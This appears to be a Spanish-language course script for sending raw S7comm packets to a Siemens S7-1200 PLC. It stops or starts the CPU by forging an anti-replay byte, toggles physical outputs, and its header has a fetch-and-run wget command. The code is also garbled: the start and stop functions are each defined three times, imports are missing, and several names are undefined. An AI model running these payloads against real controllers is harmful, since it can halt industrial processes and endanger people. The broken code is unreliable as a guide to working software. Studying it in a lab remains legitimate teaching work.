#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para interactuar con un PLC Siemens S7-1200, versión 1214c
#
# Ejecución remota (puede requerir permisos sudo):
#   wget -q -N --no-cache https://raw.githubusercontent.com/nipegun/Zubiri/refs/heads/main/CETI/SegInd/zubiri-test/play.py && python3 play.py [IPDelPLC]
#
# Bajar y editar directamente el archivo en nano:
#   curl -sL https://raw.githubusercontent.com/nipegun/Zubiri/refs/heads/main/CETI/SegInd/zubiri-test/play.py | nano -
# ----------


def fEnviarPayload(pData, pSocket):
  if pSocket is None:
    print("\n  Error: No hay conexión establecida.")
    return None
  try:
    pSocket.send(bytearray.fromhex(pData))
    vResp = pSocket.recv(1024)
    if vResp:
      print(f"\n  Respuesta del PLC: {vResp.hex()}\n")
    else:
      print("\n  No se recibió respuesta del PLC.\n")
    return vResp
  except socket.timeout:
    print("\n  Se esperó 5 segundos y el PLC no respondió.")
    return None

def fEncenderPLC(pHost):
  
  vPayloadSolComCOTP  = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'   #LENGTH 89
  vPayloadSolComS7    = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'   #LENGTH 292
  vPayloadAntiReplay  = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'   #LENGTH 197
  vPayloadEncenderPLC = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'   #LENGTH 121
  vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  vSocketConPLC.connect((pHost, 102))
  vPayloadResp = fEnviarPayload(vPayloadSolComCOTP, vSocketConPLC)
  vPayloadResp = fEnviarPayload(vPayloadSolComS7,   vSocketConPLC)
  vChallenge = vPayloadResp.hex()[48:50]
  vAntiReplay = int(vChallenge, 16) + int("80", 16)
  vPayloadAntiReplay  = vPayloadAntiReplay[:46]  + hex(vAntiReplay)[2] + vPayloadAntiReplay[47:]
  vPayloadAntiReplay  = vPayloadAntiReplay[:47]  + hex(vAntiReplay)[3] + vPayloadAntiReplay[48:]
  # Modificar el payload de apagado inyectándole el anti-replay
  vPayloadEncenderPLC = vPayloadEncenderPLC[:46] + hex(vAntiReplay)[2] + vPayloadEncenderPLC[47:]
  vPayloadEncenderPLC = vPayloadEncenderPLC[:47] + hex(vAntiReplay)[3] + vPayloadEncenderPLC[48:]
  vPayloadResp = fEnviarPayload(vPayloadEncenderPLC, vSocketConPLC)
  print("Encendiendo el PLC...")
  vSocketConPLC.close()


def fApagarPLC(pHost):
  vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a' # Lenght 89
  vPayloadSolComS7   = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000' # Lenght 292
  vPayloadAntiReplay = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000' # Lenght 197
  vPayloadApagarPLC  = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000' # Length 121
  vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  vSocketConPLC.connect((pHost, 102))
  vPayloadResp = fEnviarPayload(vPayloadSolComCOTP, vSocketConPLC)
  vPayloadResp = fEnviarPayload(vPayloadSolComS7,   vSocketConPLC)
  vChallenge = vPayloadResp.hex()[48:50]
  vAntiReplay = int(vChallenge, 16) + int("80", 16)
  vPayloadAntiReplay = vPayloadAntiReplay[:46] + hex(vAntiReplay)[2] + vPayloadAntiReplay[47:]
  vPayloadAntiReplay = vPayloadAntiReplay[:47] + hex(vAntiReplay)[3] + vPayloadAntiReplay[48:]
  # Modificar el payload de apagado inyectándole el anti-replay
  vPayloadApagarPLC  = vPayloadApagarPLC[:46]  + hex(vAntiReplay)[2] + vPayloadApagarPLC[47:]
  vPayloadApagarPLC  = vPayloadApagarPLC[:47]  + hex(vAntiReplay)[3] + vPayloadApagarPLC[48:]
  vPayloadResp = fEnviarPayload(vPayloadAntiReplay, vSocketConPLC)
  vPayloadResp = fEnviarPayload(vPayloadApagarPLC,  vSocketConPLC)
  print("Apagando el PLC...")
  vSocketConPLC.close()


# Definir constantes para colores
cColorAzul='\033[0;34m'
cColorAzulClaro='\033[1;34m'
cColorVerde='\033[1;32m'
cColorRojo='\033[1;31m'
cFinColor='\033[0m' # Vuelve al color normal


def fEncenderPLC(pHost):
  vSocketPLC = fConectar(pHost)
  if not vSocketPLC:
    return

  vSolCommCOTP =     '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
  vSolCommS7 =       '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
  vAntiReplay =      '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
  vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'

  fEnviarPayload(vSolCommCOTP, vSocketPLC)
  data = fEnviarPayload(vSolCommS7, vSocketPLC)
  if not data:
    vSocketPLC.close()
    return

  #vAntiReplay = fCalcularAntiReplay(data)
  vPayloadEncender = fModificarPayload(vPayloadEncender, vAntiReplay)

  fEnviarPayload(vPayloadEncender, vSocketPLC)
  print("\n  PLC iniciado correctamente \n.")
  vSocketPLC.close()


def fApagarPLC(vHost):
  vSocketPLC = fConectar(vHost)
  if not vSocketPLC:
    return

  vSolCommCOTP =   '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
  vSolCommS7 =     '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
  vAntiReplay =    '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
  vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'

  fEnviarPayload(vSolCommCOTP, vSocketPLC)
  data = fEnviarPayload(vSolCommS7, vSocketPLC)
  if not data:
    vSocketPLC.close()
    return

  #vAntiReplay = fCalcularAntiReplay(data)
  vPayloadApagar = fModificarPayload(vPayloadApagar, vAntiReplay)

  fEnviarPayload(vPayloadApagar, vSocketPLC)
  print("\n  PLC detenido correctamente. \n")
  vSocketPLC.close()





def fEncenderPLC(pHost):

  # Cuarto payload: vPayloadEncender para encender el PLC
  vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
  vRespPayloadEncender = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'

  try:
    vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vSocketConPLC.settimeout(2)
    vSocketConPLC.connect((pHost, 102))

    # 1. Enviar primer payload: vPayloadSolComCOTP
    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
    print(f"Solicitud: {vPayloadSolComCOTP}")
    vResp = vSocketConPLC.recv(1024)
    if not vResp:
      print(f"No se recibió respuesta al enviar {vPayloadSolComCOTP}")
      vSocketConPLC.close()
      return
    data_hex = vResp.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadSolComCOTP:
      print("La respuesta a vPayloadSolComCOTP no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 2. Enviar segundo payload: vPayloadSolComS7
    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
    print(f"Solicitud: {vPayloadSolComS7}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadSolComS7}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadSolComS7:
      print("La respuesta a vPayloadSolComS7 no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 3. Enviar tercer payload: vPayloadAntiReplay
    vSocketConPLC.send(bytearray.fromhex(vPayloadAntiReplay))
    print(f"Solicitud: {vPayloadAntiReplay}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print("No se recibió respuesta al enviar vPayloadAntiReplay")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadAntiReplay:
      print("La respuesta a vPayloadAntiReplay no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 4. Enviar cuarto payload: vPayloadEncender
    vSocketConPLC.send(bytearray.fromhex(vPayloadEncender))
    print(f"Solicitud: {vPayloadEncender}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadEncender}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadEncender:
      print("La respuesta a vPayloadEncender no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    print("\nPLC encendido correctamente!")
  except socket.timeout:
    print("Se agotó el tiempo de espera al comunicarse con el PLC")
  except Exception as e:
    print(f"Error al conectar o comunicarse con el PLC: {e}")
  finally:
    vSocketConPLC.close()


def fApagarPLC(pHost):

  # Cuarto payload: vPayloadApagar para apagar el PLC
  vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
  vRespPayloadApagar = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'

  try:
    vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vSocketConPLC.settimeout(2)
    vSocketConPLC.connect((pHost, 102))

    # 1. Enviar primer payload: vPayloadSolComCOTP
    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
    print(f"Solicitud: {vPayloadSolComCOTP}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadSolComCOTP}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadSolComCOTP:
      print("La respuesta a vPayloadSolComCOTP no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 2. Enviar segundo payload: vPayloadSolComS7
    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
    print(f"Solicitud: {vPayloadSolComS7}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadSolComS7}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadSolComS7:
      print("La respuesta a vPayloadSolComS7 no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 3. Enviar tercer payload: vPayloadAntiReplay
    vSocketConPLC.send(bytearray.fromhex(vPayloadAntiReplay))
    print(f"Solicitud: {vPayloadAntiReplay}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print("No se recibió respuesta al enviar vPayloadAntiReplay")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadAntiReplay:
      print("La respuesta a vPayloadAntiReplay no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 4. Enviar cuarto payload: vPayloadEncender
    vSocketConPLC.send(bytearray.fromhex(vPayloadApagar))
    print(f"Solicitud: {vPayloadApagar}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadApagar}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadApagar:
      print("La respuesta a vPayloadApagar no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    print("\nPLC apagado correctamente!")
  except socket.timeout:
    print("Se agotó el tiempo de espera al comunicarse con el PLC")
  except Exception as e:
    print(f"Error al conectar o comunicarse con el PLC: {e}")
  finally:
    vSocketConPLC.close()






def fEnviarPayload(pData, pSocket):
  if pSocket is None:
    print("\n  Error: No hay conexión establecida.")
    return None
  try:
    pSocket.send(bytearray.fromhex(pData))
    vResp = pSocket.recv(1024)
    if vResp:
      print(f"\n  Respuesta del PLC: {vResp.hex()}\n")
    else:
      print("\n  No se recibió respuesta del PLC.\n")
    return vResp
  except socket.timeout:
    print("\n  Se esperó 5 segundos y el PLC no respondió.")
    return None


def fEncenderSalida(vHost, salida, nombre):
  vSocketConPLC = fConectar(vHost)
  if not s:
    return

  vSolCommCOTP = '0300001611e00000cfc400c0010ac1020100c2020101'
  vSolCommS7 =   '0300001902f08032010000000000080000f0000008000803c0'
  cSalidas = {
    '%Q0.0':  '0300002502f08032010000001f000e00060501120a10010001000082000000000300010100',
    '%Q0.1':  '0300002502f08032010000001f000e00060501120a10010001000082000001000300010100',
    '%Q0.2':  '0300002502f08032010000001f000e00060501120a10010001000082000002000300010100',
    '%Q0.3':  '0300002502f08032010000001f000e00060501120a10010001000082000003000300010100',
    '%Q0.4':  '0300002502f08032010000001f000e00060501120a10010001000082000004000300010100',
    '%Q0.5':  '0300002502f08032010000001f000e00060501120a10010001000082000005000300010100',
    '%Q0.6':  '0300002502f08032010000001f000e00060501120a10010001000082000006000300010100',
    '%Q0.7':  '0300002502f08032010000001f000e00060501120a10010001000082000007000300010100',
    '%Q1.0':  '0300002502f08032010000001f000e00060501120a10010001000082000008000300010100',
    '%Q1.1':  '0300002502f08032010000001f000e00060501120a10010001000082000009000300010100'
  }

  if salida not in cSalidas:
    print(f"\n  Salida {nombre} no definida. \n")
    vSocketConPLC.close()
    return

  for cmd in [vSolCommCOTP, vSolCommS7, cSalidas[salida]]:
    fEnviarPayload(cmd, s)

  print(f"\n  Salida {nombre} activada correctamente. \n")
  vSocketConPLC.close()


def fApagarSalida(vHost, salida, nombre):
  vSocketConPLC = fConectar(vHost)
  if not s:
    return

  vSolCommCOTP = '0300001611e00000cfc400c0010ac1020100c2020101'
  vSolCommS7 = '0300001902f08032010000000000080000f0000008000803c0'
  comandos = {
    '%Q0.0':  '0300002502f08032010000001f000e00060501120a10010001000082000000000300010000',
    '%Q0.1':  '0300002502f08032010000001f000e00060501120a10010001000082000001000300010000',
    '%Q0.2':  '0300002502f08032010000001f000e00060501120a10010001000082000002000300010000',
    '%Q0.3':  '0300002502f08032010000001f000e00060501120a10010001000082000003000300010000',
    '%Q0.4':  '0300002502f08032010000001f000e00060501120a10010001000082000004000300010000',
    '%Q0.5':  '0300002502f08032010000001f000e00060501120a10010001000082000005000300010000',
    '%Q0.6':  '0300002502f08032010000001f000e00060501120a10010001000082000006000300010000',
    '%Q0.7':  '0300002502f08032010000001f000e00060501120a10010001000082000007000300010000',
    '%Q0.8':  '0300002502f08032010000001f000e00060501120a10010001000082000008000300010000',
    '%Q0.9':  '0300002502f08032010000001f000e00060501120a10010001000082000009000300010000',
  }

  if salida not in comandos:
    print(f"\n  Salida {nombre} no definida. \n")
    vSocketConPLC.close()
    return

  for cmd in [vSolCommCOTP, vSolCommS7, comandos[salida]]:
    fEnviarPayload(cmd, s)

  print(f"\n  Salida {nombre} desactivada correctamente. \n")
  vSocketConPLC.close()




if __name__ == "__main__":
  if len(sys.argv) > 1:
    vHost = sys.argv[1]
    if not fDeterminarSiIPoFQDN(vHost):
      print(cColorRojo + "\n  La dirección proporcionada no es una IP válida ni un FQDN.\n" + cFinColor)
      sys.exit(1)
    curses.wrapper(lambda stdscr: fMenu(stdscr, vHost))
  else:
    print(cColorRojo + "\n  No has indicado cual es la IP del PLC.\n" + cFinColor)
    print("  Uso correcto: python3 [RutaAlScript.py] [IPDelPLC] \n")
